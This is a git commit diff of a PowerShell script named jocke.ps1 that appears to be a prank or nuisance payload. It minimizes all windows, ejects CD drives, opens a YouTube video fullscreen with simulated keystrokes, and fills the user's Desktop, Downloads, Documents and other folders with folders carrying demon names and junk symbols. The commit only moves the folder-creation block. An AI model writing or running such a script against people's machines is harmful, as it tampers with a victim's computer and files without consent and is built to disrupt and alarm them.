b3f63eed92770e0657496ea56650e92a2511fdd7
dadmins1984 <116805139+dadmins1984@users.noreply.github.com>
2022-11-30 13:29:11 +0100

    Update jocke.ps1

--- jocke.ps1
+++ jocke.ps1
@@ -1,5 +1,3 @@
-function RRfolder {mkdir Aamon######;mkdir Apollyon##;mkdir Abezethibou;mkdir %%%%Abraxas;mkdir Abyzou++;mkdir Achlys-666;mkdir Adrammelech##;mkdir Aeshma;mkdir Agaliarept%^%^;mkdir Agares%;mkdir %%$#Agiel%%;mkdir Ahriman;mkdir Alastor;mkdir Alloces;mkdir Armaros!@#%;mkdir Archon^%;mkdir Funny_Games666;mkdir ^#Arunasura$%^%#;mkdir %##%%^Bakasura%^##;mkdir Baku$%#;mkdir Beelzebub%%;}
-cd C:\Users\$env:UserName\Desktop;RRfolder;cd C:\Users\$env:UserName\Downloads;RRfolder;cd C:\Users\$env:UserName\Documents;RRfolder;cd C:\Users\$env:UserName\Favorites;RRfolder;cd C:\Users\$env:UserName\Links;RRfolder;cd C:\Users\$env:UserName\Music;RRfolder;cd C:\Users\$env:UserName\Videos;RRfolder;cd C:\Users\$env:UserName\Contacts;RRfolder;
 $x = New-Object -ComObject Shell.Application
 $x.minimizeall()
 $sh = New-Object -ComObject "Shell.Application"
@@ -8,6 +6,8 @@ Where-Object { $_.Type -eq "CD Drive" } |
 foreach { $_.InvokeVerb("Eject") }
 start-process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://www.youtube.com/watch?v=zfwJiG2F698#t=2m32s ; Start-Sleep -Milliseconds 950 ; [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') ; [System.Windows.Forms.SendKeys]::SendWait("{F11}")
 Add-Type -AssemblyName System.Windows.Forms
+function RRfolder {mkdir Aamon######;mkdir Apollyon##;mkdir Abezethibou;mkdir %%%%Abraxas;mkdir Abyzou++;mkdir Achlys-666;mkdir Adrammelech##;mkdir Aeshma;mkdir Agaliarept%^%^;mkdir Agares%;mkdir %%$#Agiel%%;mkdir Ahriman;mkdir Alastor;mkdir Alloces;mkdir Armaros!@#%;mkdir Archon^%;mkdir Funny_Games666;mkdir ^#Arunasura$%^%#;mkdir %##%%^Bakasura%^##;mkdir Baku$%#;mkdir Beelzebub%%;}
+cd C:\Users\$env:UserName\Desktop;RRfolder;cd C:\Users\$env:UserName\Downloads;RRfolder;cd C:\Users\$env:UserName\Documents;RRfolder;cd C:\Users\$env:UserName\Favorites;RRfolder;cd C:\Users\$env:UserName\Links;RRfolder;cd C:\Users\$env:UserName\Music;RRfolder;cd C:\Users\$env:UserName\Videos;RRfolder;cd C:\Users\$env:UserName\Contacts;RRfolder;
 $timeout = new-timespan -Seconds 80 
 $sw = [diagnostics.stopwatch]::StartNew()
 while ($sw.elapsed -lt $timeout){
